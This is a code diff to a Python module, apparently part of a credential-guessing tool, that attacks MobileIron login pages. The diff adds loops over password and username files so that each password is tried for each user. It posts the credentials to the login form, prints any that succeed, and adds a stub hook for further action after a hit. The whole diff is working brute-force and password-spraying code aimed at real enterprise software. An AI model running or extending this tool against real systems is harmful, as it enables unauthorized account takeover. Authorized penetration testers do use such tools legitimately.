@@ -12,6 +12,8 @@ class MobileIronBrute(webModule):
         super(MobileIronBrute, self).__init__(config, display, lock)
         self.fingerprint="MobileIron"
         self.response="Success"
+    def somethingCool(self, config):
+        print("[-] Not yet implemented...")
     def connectTest(self, config, payload):
         with session() as c:
             requests.packages.urllib3.disable_warnings()
@@ -24,21 +26,44 @@ class MobileIronBrute(webModule):
             m = re.search('You are unauthorized to access this page.', cpost.text)
             if m:
                 print("[+]  User Credentials Successful: " + config["USERNAME"] + ":" + config["PASSWORD"])
+                if not config["dry_run"]:
+                    print("[!] Time to do something cool!")
+                    self.somethingCool(config)
             else:
                 print("[-]  Login Failed for: " + config["USERNAME"] + ":" + config["PASSWORD"])
     def payload(self, config):
-        if config["UserFile"]:
-                lines = [line.rstrip('\n') for line in open(config["UserFile"])]
-                for line in lines:
-                    config["USERNAME"] = line.strip('\n')
+        if config["PASS_FILE"]:
+            pass_lines = [pass_line.rstrip('\n') for pass_line in open(config["PASS_FILE"])]
+            for pass_line in pass_lines:
+                if config["UserFile"]:
+                    lines = [line.rstrip('\n') for line in open(config["UserFile"])]
+                    for line in lines:
+                        config["USERNAME"] = line.strip('\n')
+                        config["PASSWORD"] = pass_line.strip('\n')
+                        payload = {
+                            'j_username': config["USERNAME"],
+                            'j_password': config["PASSWORD"]
+                            }
+                        self.connectTest(config, payload)
+                else:
+                    config["PASSWORD"] = pass_line.strip('\n')
                     payload = {
                         'j_username': config["USERNAME"],
                         'j_password': config["PASSWORD"]
                         }
                     self.connectTest(config, payload)
+        elif config["UserFile"]:
+            lines = [line.rstrip('\n') for line in open(config["UserFile"])]
+            for line in lines:
+                config["USERNAME"] = line.strip('\n')
+                payload = {
+                    'j_username': config["USERNAME"],
+                    'j_password': config["PASSWORD"]
+                    }
+                self.connectTest(config, payload)
         else:
             payload = {
                 'j_username': config["USERNAME"],
                 'j_password': config["PASSWORD"]
-                }
+            }
             self.connectTest(config, payload)
